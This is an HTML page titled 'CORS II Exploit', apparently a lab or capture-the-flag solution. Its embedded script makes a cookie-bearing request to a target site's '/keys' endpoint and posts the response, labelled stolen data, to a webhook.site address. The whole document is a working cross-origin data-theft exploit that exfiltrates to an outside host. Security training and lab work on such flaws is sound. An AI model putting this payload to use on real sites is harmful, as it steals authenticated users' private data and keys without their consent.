<!DOCTYPE html>
<html>
<head>
    <title>CORS II Exploit</title>
</head>
<body>
    <h1>Exploiting CORS Misconfiguration...</h1>
    <script>
        // 1. Define the target URL and your webhook
        var targetUrl = "https://ptl-29f079a0b03c-66be1acf5fbb.libcurl.me/keys";
        var webhookUrl = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";

        // 2. Create the XHR request to the vulnerable site
        var xhr = new XMLHttpRequest();
        xhr.open("GET", targetUrl, true);
        
        // This is the most critical part: it tells the browser to send cookies
        xhr.withCredentials = true;

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                // 3. Once we have the data, send it to the webhook
                var stolenData = xhr.responseText;
                
                // We use another XHR or a simple GET request via an Image object to exfiltrate
                var exfil = new XMLHttpRequest();
                exfil.open("POST", webhookUrl, true);
                exfil.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                exfil.send("data=" + encodeURIComponent(stolenData));
                
                console.log("Data sent to webhook: " + stolenData);
            }
        };

        xhr.send();
    </script>
</body>
</html>
